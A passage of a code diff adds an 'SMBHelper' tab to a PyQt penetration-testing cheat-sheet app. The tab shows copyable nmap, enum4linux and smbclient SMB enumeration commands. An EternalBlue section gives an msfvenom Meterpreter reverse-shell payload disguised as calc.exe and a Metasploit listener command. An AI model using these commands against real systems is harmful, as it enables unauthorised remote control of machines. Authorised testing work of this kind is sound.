@@ -70,6 +70,7 @@ class MainWindow(QMainWindow):
         self.tab5 = QWidget()
         self.tab6 = QWidget()
         self.tab7 = QWidget()
+        self.tab8 = QWidget()
         self.tabs.addTab(self.tab1, "Initial Recon")
         self.tabs.addTab(self.tab2, "HTTPHelper")
         self.tabs.addTab(self.tab3, "Linux Priv Esc")
@@ -77,6 +78,7 @@ class MainWindow(QMainWindow):
         self.tabs.addTab(self.tab5, "TTY Shell Breakout")
         self.tabs.addTab(self.tab6, "RevShells")
         self.tabs.addTab(self.tab7, "MSFVenom")
+        self.tabs.addTab(self.tab8, "SMBHelper")
         self.tabs.currentChanged.connect(self.tabChanged)
 
         # Create a settings button
@@ -515,7 +517,8 @@ class MainWindow(QMainWindow):
             self.revShells()
         elif current_tab == 6:
             self.msfvenom()
-
+        elif current_tab == 7:
+            self.smbhelper()
 #### Recon
     def recon(self):
         if not hasattr(self, 'tab1_container'):
@@ -19653,6 +19656,1235 @@ class MainWindow(QMainWindow):
         self.tab7_container_layout.insertWidget(202, self.msfv_web_badchar_divider2)
         self.tab7_container_layout.insertWidget(203, self.msfv_web_badchar_spacer2)
         self.tab7_container_layout.addStretch()
+
+#### SMBHelper
+    def smbhelper(self):
+        if not hasattr(self, 'tab8_container'):
+            self.tab8_container = QWidget()
+            self.tab8_container_layout = QVBoxLayout(self.tab8_container)
+            self.tab8_container.setLayout(self.tab8_container_layout)
+            self.scroll = QScrollArea()
+            self.scroll.setWidget(self.tab8_container)
+            self.scroll.setWidgetResizable(True)
+            self.tab8_container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
+            self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
+            self.tab8_container_layout.setContentsMargins(0,0,0,0)
+            self.tab8_container.adjustSize()
+            self.tab8.setLayout(QVBoxLayout())
+            self.tab8.layout().addWidget(self.scroll)
+
+    # smbhelper_top_spacer1
+        if hasattr(self, 'smbhelper_top_spacer1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_top_spacer1)
+            self.smbhelper_top_spacer1.deleteLater()
+        self.smbhelper_top_spacer1 = QLabel()
+        self.smbhelper_top_spacer1.setFixedWidth(40)
+        self.smbhelper_top_spacer1.setFixedHeight(50)
+     
+        # smbhelper_top_spacer_layout
+        self.tab8_container_layout.insertWidget(0, self.smbhelper_top_spacer1)
+        self.tab8_container_layout.addStretch()
+
+    # smbhelper_nmap
+        if hasattr(self, 'smbhelper_nmap'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_nmap)
+            self.smbhelper_nmap.deleteLater()
+        self.smbhelper_nmap = QLabel("[ + Enumeration NMAP ]")
+        self.smbhelper_nmap.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab8_container_layout.insertWidget(1,self.smbhelper_nmap)
+     
+        # smbhelper_nmap_Scan1
+        if hasattr(self, 'smbhelper_nmap_Scan1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_nmap_Scan1)
+            self.smbhelper_nmap_Scan1.deleteLater()
+        self.smbhelper_nmap_Scan1 = QLabel("nmap -p" + self.rport + " --script=smb-enum-shares " + self.rhost + "")
+        self.smbhelper_nmap_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab8_container_layout.insertWidget(2,self.smbhelper_nmap_Scan1)
+     
+        # smbhelper_nmap_Scan1_Copy
+        if hasattr(self, 'smbhelper_nmap_Scan1_Copy'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_nmap_Scan1_Copy)
+            self.smbhelper_nmap_Scan1_Copy.deleteLater()
+        self.smbhelper_nmap_Scan1_Copy = QPushButton()
+        self.smbhelper_nmap_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.smbhelper_nmap_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.smbhelper_nmap_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_nmap_Scan1.text()))
+        self.smbhelper_nmap_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # smbhelper_nmap_Scan1 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.smbhelper_nmap_Scan1_Copy)
+        label_layout.addWidget(self.smbhelper_nmap_Scan1)
+        self.tab8_container_layout.insertLayout(3, label_layout)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_nmap_divider1
+        if hasattr(self, 'smbhelper_nmap_divider1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_nmap_divider1)
+            self.smbhelper_nmap_divider1.deleteLater()
+        self.smbhelper_nmap_divider1 = QFrame()
+        self.smbhelper_nmap_divider1.setFrameShape(QFrame.HLine)
+        self.smbhelper_nmap_divider1.setLineWidth(3)
+        self.smbhelper_nmap_divider1.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_nmap_divider2
+        if hasattr(self, 'smbhelper_nmap_divider2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_nmap_divider2)
+            self.smbhelper_nmap_divider2.deleteLater()
+        self.smbhelper_nmap_divider2 = QFrame()
+        self.smbhelper_nmap_divider2.setFrameShape(QFrame.HLine)
+        self.smbhelper_nmap_divider2.setLineWidth(3)
+        self.smbhelper_nmap_divider2.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_nmap_spacer1
+        if hasattr(self, 'smbhelper_nmap_spacer1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_nmap_spacer1)
+            self.smbhelper_nmap_spacer1.deleteLater()
+        self.smbhelper_nmap_spacer1 = QLabel()
+        self.smbhelper_nmap_spacer1.setFixedWidth(40)
+        self.smbhelper_nmap_spacer1.setFixedHeight(50)
+     
+        # smbhelper_nmap_spacer2
+        if hasattr(self, 'smbhelper_nmap_spacer2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_nmap_spacer2)
+            self.smbhelper_nmap_spacer2.deleteLater()
+        self.smbhelper_nmap_spacer2 = QLabel()
+        self.smbhelper_nmap_spacer2.setFixedWidth(40)
+        self.smbhelper_nmap_spacer2.setFixedHeight(50)
+     
+        # smbhelper_nmap spacer & divider layout
+        self.tab8_container_layout.insertWidget(4, self.smbhelper_nmap_spacer1)
+        self.tab8_container_layout.insertWidget(5, self.smbhelper_nmap_divider1)
+        self.tab8_container_layout.insertWidget(6, self.smbhelper_nmap_divider2)
+        self.tab8_container_layout.insertWidget(7, self.smbhelper_nmap_spacer2)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_nmap_Scan2
+        if hasattr(self, 'smbhelper_nmap_Scan2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_nmap_Scan2)
+            self.smbhelper_nmap_Scan2.deleteLater()
+        self.smbhelper_nmap_Scan2 = QLabel("nmap -p" + self.rport + " -Pn --script=smb-vuln-*.nse " + self.rhost + "")
+        self.smbhelper_nmap_Scan2.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab8_container_layout.insertWidget(8,self.smbhelper_nmap_Scan2)
+     
+        # smbhelper_nmap_Scan2_Copy
+        if hasattr(self, 'smbhelper_nmap_Scan2_Copy'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_nmap_Scan2_Copy)
+            self.smbhelper_nmap_Scan2_Copy.deleteLater()
+        self.smbhelper_nmap_Scan2_Copy = QPushButton()
+        self.smbhelper_nmap_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.smbhelper_nmap_Scan2_Copy.setFixedSize(QSize(20,20))
+        self.smbhelper_nmap_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_nmap_Scan2.text()))
+        self.smbhelper_nmap_Scan2_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # smbhelper_nmap_Scan2 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.smbhelper_nmap_Scan2_Copy)
+        label_layout.addWidget(self.smbhelper_nmap_Scan2)
+        self.tab8_container_layout.insertLayout(9, label_layout)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_nmap_divider1
+        if hasattr(self, 'smbhelper_nmap_divider1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_nmap_divider1)
+            self.smbhelper_nmap_divider1.deleteLater()
+        self.smbhelper_nmap_divider1 = QFrame()
+        self.smbhelper_nmap_divider1.setFrameShape(QFrame.HLine)
+        self.smbhelper_nmap_divider1.setLineWidth(3)
+        self.smbhelper_nmap_divider1.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_nmap_divider2
+        if hasattr(self, 'smbhelper_nmap_divider2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_nmap_divider2)
+            self.smbhelper_nmap_divider2.deleteLater()
+        self.smbhelper_nmap_divider2 = QFrame()
+        self.smbhelper_nmap_divider2.setFrameShape(QFrame.HLine)
+        self.smbhelper_nmap_divider2.setLineWidth(3)
+        self.smbhelper_nmap_divider2.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_nmap_spacer1
+        if hasattr(self, 'smbhelper_nmap_spacer1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_nmap_spacer1)
+            self.smbhelper_nmap_spacer1.deleteLater()
+        self.smbhelper_nmap_spacer1 = QLabel()
+        self.smbhelper_nmap_spacer1.setFixedWidth(40)
+        self.smbhelper_nmap_spacer1.setFixedHeight(50)
+     
+        # smbhelper_nmap_spacer2
+        if hasattr(self, 'smbhelper_nmap_spacer2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_nmap_spacer2)
+            self.smbhelper_nmap_spacer2.deleteLater()
+        self.smbhelper_nmap_spacer2 = QLabel()
+        self.smbhelper_nmap_spacer2.setFixedWidth(40)
+        self.smbhelper_nmap_spacer2.setFixedHeight(50)
+     
+        # smbhelper_nmap spacer & divider layout
+        self.tab8_container_layout.insertWidget(10, self.smbhelper_nmap_spacer1)
+        self.tab8_container_layout.insertWidget(11, self.smbhelper_nmap_divider1)
+        self.tab8_container_layout.insertWidget(12, self.smbhelper_nmap_divider2)
+        self.tab8_container_layout.insertWidget(13, self.smbhelper_nmap_spacer2)
+        self.tab8_container_layout.addStretch()
+     
+    # smbhelper_enum4linux
+        if hasattr(self, 'smbhelper_enum4linux'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_enum4linux)
+            self.smbhelper_enum4linux.deleteLater()
+        self.smbhelper_enum4linux = QLabel("[ + Enum4Linux ]")
+        self.smbhelper_enum4linux.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab8_container_layout.insertWidget(14,self.smbhelper_enum4linux)
+     
+        # smbhelper_enum4linux_Scan1
+        if hasattr(self, 'smbhelper_enum4linux_Scan1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_enum4linux_Scan1)
+            self.smbhelper_enum4linux_Scan1.deleteLater()
+        self.smbhelper_enum4linux_Scan1 = QLabel("enum4linux -a " + self.rhost + "")
+        self.smbhelper_enum4linux_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab8_container_layout.insertWidget(15,self.smbhelper_enum4linux_Scan1)
+     
+        # smbhelper_enum4linux_Scan1_Copy
+        if hasattr(self, 'smbhelper_enum4linux_Scan1_Copy'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_enum4linux_Scan1_Copy)
+            self.smbhelper_enum4linux_Scan1_Copy.deleteLater()
+        self.smbhelper_enum4linux_Scan1_Copy = QPushButton()
+        self.smbhelper_enum4linux_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.smbhelper_enum4linux_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.smbhelper_enum4linux_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_enum4linux_Scan1.text()))
+        self.smbhelper_enum4linux_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # smbhelper_enum4linux_Scan1 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.smbhelper_enum4linux_Scan1_Copy)
+        label_layout.addWidget(self.smbhelper_enum4linux_Scan1)
+        self.tab8_container_layout.insertLayout(16, label_layout)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_enum4linux_divider1
+        if hasattr(self, 'smbhelper_enum4linux_divider1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_enum4linux_divider1)
+            self.smbhelper_enum4linux_divider1.deleteLater()
+        self.smbhelper_enum4linux_divider1 = QFrame()
+        self.smbhelper_enum4linux_divider1.setFrameShape(QFrame.HLine)
+        self.smbhelper_enum4linux_divider1.setLineWidth(3)
+        self.smbhelper_enum4linux_divider1.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_enum4linux_divider2
+        if hasattr(self, 'smbhelper_enum4linux_divider2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_enum4linux_divider2)
+            self.smbhelper_enum4linux_divider2.deleteLater()
+        self.smbhelper_enum4linux_divider2 = QFrame()
+        self.smbhelper_enum4linux_divider2.setFrameShape(QFrame.HLine)
+        self.smbhelper_enum4linux_divider2.setLineWidth(3)
+        self.smbhelper_enum4linux_divider2.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_enum4linux_spacer1
+        if hasattr(self, 'smbhelper_enum4linux_spacer1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_enum4linux_spacer1)
+            self.smbhelper_enum4linux_spacer1.deleteLater()
+        self.smbhelper_enum4linux_spacer1 = QLabel()
+        self.smbhelper_enum4linux_spacer1.setFixedWidth(40)
+        self.smbhelper_enum4linux_spacer1.setFixedHeight(50)
+     
+        # smbhelper_enum4linux_spacer2
+        if hasattr(self, 'smbhelper_enum4linux_spacer2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_enum4linux_spacer2)
+            self.smbhelper_enum4linux_spacer2.deleteLater()
+        self.smbhelper_enum4linux_spacer2 = QLabel()
+        self.smbhelper_enum4linux_spacer2.setFixedWidth(40)
+        self.smbhelper_enum4linux_spacer2.setFixedHeight(50)
+     
+        # smbhelper_enum4linux spacer & divider layout
+        self.tab8_container_layout.insertWidget(17, self.smbhelper_enum4linux_spacer1)
+        self.tab8_container_layout.insertWidget(18, self.smbhelper_enum4linux_divider1)
+        self.tab8_container_layout.insertWidget(19, self.smbhelper_enum4linux_divider2)
+        self.tab8_container_layout.insertWidget(20, self.smbhelper_enum4linux_spacer2)
+        self.tab8_container_layout.addStretch()
+     
+    # smbhelper_SMBClient
+        if hasattr(self, 'smbhelper_SMBClient'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient)
+            self.smbhelper_SMBClient.deleteLater()
+        self.smbhelper_SMBClient = QLabel("[ + SMBClient ]")
+        self.smbhelper_SMBClient.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab8_container_layout.insertWidget(21,self.smbhelper_SMBClient)
+     
+        # smbhelper_SMBClient_Scan1
+        if hasattr(self, 'smbhelper_SMBClient_Scan1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient_Scan1)
+            self.smbhelper_SMBClient_Scan1.deleteLater()
+        self.smbhelper_SMBClient_Scan1 = QLabel("smbclient -L  -N  " + self.rhost + "")
+        self.smbhelper_SMBClient_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab8_container_layout.insertWidget(22,self.smbhelper_SMBClient_Scan1)
+     
+        # smbhelper_SMBClient_Scan1_Copy
+        if hasattr(self, 'smbhelper_SMBClient_Scan1_Copy'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient_Scan1_Copy)
+            self.smbhelper_SMBClient_Scan1_Copy.deleteLater()
+        self.smbhelper_SMBClient_Scan1_Copy = QPushButton()
+        self.smbhelper_SMBClient_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.smbhelper_SMBClient_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.smbhelper_SMBClient_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_SMBClient_Scan1.text()))
+        self.smbhelper_SMBClient_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # smbhelper_SMBClient_Scan1 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.smbhelper_SMBClient_Scan1_Copy)
+        label_layout.addWidget(self.smbhelper_SMBClient_Scan1)
+        self.tab8_container_layout.insertLayout(23, label_layout)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_SMBClient_divider1
+        if hasattr(self, 'smbhelper_SMBClient_divider1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient_divider1)
+            self.smbhelper_SMBClient_divider1.deleteLater()
+        self.smbhelper_SMBClient_divider1 = QFrame()
+        self.smbhelper_SMBClient_divider1.setFrameShape(QFrame.HLine)
+        self.smbhelper_SMBClient_divider1.setLineWidth(3)
+        self.smbhelper_SMBClient_divider1.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_SMBClient_divider2
+        if hasattr(self, 'smbhelper_SMBClient_divider2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient_divider2)
+            self.smbhelper_SMBClient_divider2.deleteLater()
+        self.smbhelper_SMBClient_divider2 = QFrame()
+        self.smbhelper_SMBClient_divider2.setFrameShape(QFrame.HLine)
+        self.smbhelper_SMBClient_divider2.setLineWidth(3)
+        self.smbhelper_SMBClient_divider2.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_SMBClient_spacer1
+        if hasattr(self, 'smbhelper_SMBClient_spacer1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient_spacer1)
+            self.smbhelper_SMBClient_spacer1.deleteLater()
+        self.smbhelper_SMBClient_spacer1 = QLabel()
+        self.smbhelper_SMBClient_spacer1.setFixedWidth(40)
+        self.smbhelper_SMBClient_spacer1.setFixedHeight(50)
+     
+        # smbhelper_SMBClient_spacer2
+        if hasattr(self, 'smbhelper_SMBClient_spacer2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient_spacer2)
+            self.smbhelper_SMBClient_spacer2.deleteLater()
+        self.smbhelper_SMBClient_spacer2 = QLabel()
+        self.smbhelper_SMBClient_spacer2.setFixedWidth(40)
+        self.smbhelper_SMBClient_spacer2.setFixedHeight(50)
+     
+        # smbhelper_SMBClient spacer & divider layout
+        self.tab8_container_layout.insertWidget(24, self.smbhelper_SMBClient_spacer1)
+        self.tab8_container_layout.insertWidget(25, self.smbhelper_SMBClient_divider1)
+        self.tab8_container_layout.insertWidget(26, self.smbhelper_SMBClient_divider2)
+        self.tab8_container_layout.insertWidget(27, self.smbhelper_SMBClient_spacer2)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_SMBClient_Scan2
+        if hasattr(self, 'smbhelper_SMBClient_Scan2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient_Scan2)
+            self.smbhelper_SMBClient_Scan2.deleteLater()
+        self.smbhelper_SMBClient_Scan2 = QLabel("smbclient -L " + self.rhost + "/share -N")
+        self.smbhelper_SMBClient_Scan2.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab8_container_layout.insertWidget(28,self.smbhelper_SMBClient_Scan2)
+     
+        # smbhelper_SMBClient_Scan2_Copy
+        if hasattr(self, 'smbhelper_SMBClient_Scan2_Copy'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient_Scan2_Copy)
+            self.smbhelper_SMBClient_Scan2_Copy.deleteLater()
+        self.smbhelper_SMBClient_Scan2_Copy = QPushButton()
+        self.smbhelper_SMBClient_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.smbhelper_SMBClient_Scan2_Copy.setFixedSize(QSize(20,20))
+        self.smbhelper_SMBClient_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_SMBClient_Scan2.text()))
+        self.smbhelper_SMBClient_Scan2_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # smbhelper_SMBClient_Scan2 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.smbhelper_SMBClient_Scan2_Copy)
+        label_layout.addWidget(self.smbhelper_SMBClient_Scan2)
+        self.tab8_container_layout.insertLayout(29, label_layout)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_SMBClient_divider1
+        if hasattr(self, 'smbhelper_SMBClient_divider1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient_divider1)
+            self.smbhelper_SMBClient_divider1.deleteLater()
+        self.smbhelper_SMBClient_divider1 = QFrame()
+        self.smbhelper_SMBClient_divider1.setFrameShape(QFrame.HLine)
+        self.smbhelper_SMBClient_divider1.setLineWidth(3)
+        self.smbhelper_SMBClient_divider1.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_SMBClient_divider2
+        if hasattr(self, 'smbhelper_SMBClient_divider2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient_divider2)
+            self.smbhelper_SMBClient_divider2.deleteLater()
+        self.smbhelper_SMBClient_divider2 = QFrame()
+        self.smbhelper_SMBClient_divider2.setFrameShape(QFrame.HLine)
+        self.smbhelper_SMBClient_divider2.setLineWidth(3)
+        self.smbhelper_SMBClient_divider2.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_SMBClient_spacer1
+        if hasattr(self, 'smbhelper_SMBClient_spacer1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient_spacer1)
+            self.smbhelper_SMBClient_spacer1.deleteLater()
+        self.smbhelper_SMBClient_spacer1 = QLabel()
+        self.smbhelper_SMBClient_spacer1.setFixedWidth(40)
+        self.smbhelper_SMBClient_spacer1.setFixedHeight(50)
+     
+        # smbhelper_SMBClient_spacer2
+        if hasattr(self, 'smbhelper_SMBClient_spacer2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_SMBClient_spacer2)
+            self.smbhelper_SMBClient_spacer2.deleteLater()
+        self.smbhelper_SMBClient_spacer2 = QLabel()
+        self.smbhelper_SMBClient_spacer2.setFixedWidth(40)
+        self.smbhelper_SMBClient_spacer2.setFixedHeight(50)
+     
+        # smbhelper_SMBClient spacer & divider layout
+        self.tab8_container_layout.insertWidget(30, self.smbhelper_SMBClient_spacer1)
+        self.tab8_container_layout.insertWidget(31, self.smbhelper_SMBClient_divider1)
+        self.tab8_container_layout.insertWidget(32, self.smbhelper_SMBClient_divider2)
+        self.tab8_container_layout.insertWidget(33, self.smbhelper_SMBClient_spacer2)
+        self.tab8_container_layout.addStretch()
+     
+    # smbhelper_EternalBlue
+        if hasattr(self, 'smbhelper_EternalBlue'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue)
+            self.smbhelper_EternalBlue.deleteLater()
+        self.smbhelper_EternalBlue = QLabel("[ + Eternalblue - Send Reverse Shell ]")
+        self.smbhelper_EternalBlue.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab8_container_layout.insertWidget(34,self.smbhelper_EternalBlue)
+     
+        # smbhelper_EternalBlue_Scan1
+        if hasattr(self, 'smbhelper_EternalBlue_Scan1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan1)
+            self.smbhelper_EternalBlue_Scan1.deleteLater()
+        self.smbhelper_EternalBlue_Scan1 = QLabel("msfvenom -p windows/meterpreter/reverse_tcp -f exe-service lhost=" + self.lhost + " lport=" + self.lport + " -o calc.exe")
+        self.smbhelper_EternalBlue_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab8_container_layout.insertWidget(35,self.smbhelper_EternalBlue_Scan1)
+     
+        # smbhelper_EternalBlue_Scan1_Copy
+        if hasattr(self, 'smbhelper_EternalBlue_Scan1_Copy'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan1_Copy)
+            self.smbhelper_EternalBlue_Scan1_Copy.deleteLater()
+        self.smbhelper_EternalBlue_Scan1_Copy = QPushButton()
+        self.smbhelper_EternalBlue_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.smbhelper_EternalBlue_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.smbhelper_EternalBlue_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_EternalBlue_Scan1.text()))
+        self.smbhelper_EternalBlue_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # smbhelper_EternalBlue_Scan1 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.smbhelper_EternalBlue_Scan1_Copy)
+        label_layout.addWidget(self.smbhelper_EternalBlue_Scan1)
+        self.tab8_container_layout.insertLayout(36, label_layout)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_EternalBlue_divider1
+        if hasattr(self, 'smbhelper_EternalBlue_divider1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider1)
+            self.smbhelper_EternalBlue_divider1.deleteLater()
+        self.smbhelper_EternalBlue_divider1 = QFrame()
+        self.smbhelper_EternalBlue_divider1.setFrameShape(QFrame.HLine)
+        self.smbhelper_EternalBlue_divider1.setLineWidth(3)
+        self.smbhelper_EternalBlue_divider1.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_EternalBlue_divider2
+        if hasattr(self, 'smbhelper_EternalBlue_divider2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider2)
+            self.smbhelper_EternalBlue_divider2.deleteLater()
+        self.smbhelper_EternalBlue_divider2 = QFrame()
+        self.smbhelper_EternalBlue_divider2.setFrameShape(QFrame.HLine)
+        self.smbhelper_EternalBlue_divider2.setLineWidth(3)
+        self.smbhelper_EternalBlue_divider2.setStyleSheet("color: #20C20E;")
+     
+        # smbhelper_EternalBlue_spacer1
+        if hasattr(self, 'smbhelper_EternalBlue_spacer1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer1)
+            self.smbhelper_EternalBlue_spacer1.deleteLater()
+        self.smbhelper_EternalBlue_spacer1 = QLabel()
+        self.smbhelper_EternalBlue_spacer1.setFixedWidth(40)
+        self.smbhelper_EternalBlue_spacer1.setFixedHeight(50)
+     
+        # smbhelper_EternalBlue_spacer2
+        if hasattr(self, 'smbhelper_EternalBlue_spacer2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_spacer2)
+            self.smbhelper_EternalBlue_spacer2.deleteLater()
+        self.smbhelper_EternalBlue_spacer2 = QLabel()
+        self.smbhelper_EternalBlue_spacer2.setFixedWidth(40)
+        self.smbhelper_EternalBlue_spacer2.setFixedHeight(50)
+     
+        # smbhelper_EternalBlue spacer & divider layout
+        self.tab8_container_layout.insertWidget(37, self.smbhelper_EternalBlue_spacer1)
+        self.tab8_container_layout.insertWidget(38, self.smbhelper_EternalBlue_divider1)
+        self.tab8_container_layout.insertWidget(39, self.smbhelper_EternalBlue_divider2)
+        self.tab8_container_layout.insertWidget(40, self.smbhelper_EternalBlue_spacer2)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_EternalBlue_Scan2
+        if hasattr(self, 'smbhelper_EternalBlue_Scan2'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan2)
+            self.smbhelper_EternalBlue_Scan2.deleteLater()
+        self.smbhelper_EternalBlue_Scan2 = QLabel("sudo msfconsole -q -x i\"use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp;set LHOST " + self.lhost + ";set LPORT " + self.lport + ";exploit\"")
+        self.smbhelper_EternalBlue_Scan2.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab8_container_layout.insertWidget(41,self.smbhelper_EternalBlue_Scan2)
+     
+        # smbhelper_EternalBlue_Scan2_Copy
+        if hasattr(self, 'smbhelper_EternalBlue_Scan2_Copy'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_Scan2_Copy)
+            self.smbhelper_EternalBlue_Scan2_Copy.deleteLater()
+        self.smbhelper_EternalBlue_Scan2_Copy = QPushButton()
+        self.smbhelper_EternalBlue_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.smbhelper_EternalBlue_Scan2_Copy.setFixedSize(QSize(20,20))
+        self.smbhelper_EternalBlue_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.smbhelper_EternalBlue_Scan2.text()))
+        self.smbhelper_EternalBlue_Scan2_Copy.setStyleSheet(
+            "*:hover{background: '#20C20E';}"
+        )
+     
+        # smbhelper_EternalBlue_Scan2 adding Widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.smbhelper_EternalBlue_Scan2_Copy)
+        label_layout.addWidget(self.smbhelper_EternalBlue_Scan2)
+        self.tab8_container_layout.insertLayout(42, label_layout)
+        self.tab8_container_layout.addStretch()
+     
+        # smbhelper_EternalBlue_divider1
+        if hasattr(self, 'smbhelper_EternalBlue_divider1'):
+            self.tab8_container_layout.removeWidget(self.smbhelper_EternalBlue_divider1)
+            self.smbhelper_EternalBlue_divider1.deleteLater()
+        self.smbhelper_EternalBlue_divider1 = QFrame()
+        self.smbhelper_EternalBlue_divider1.setFrameShape(QFrame.HLine)
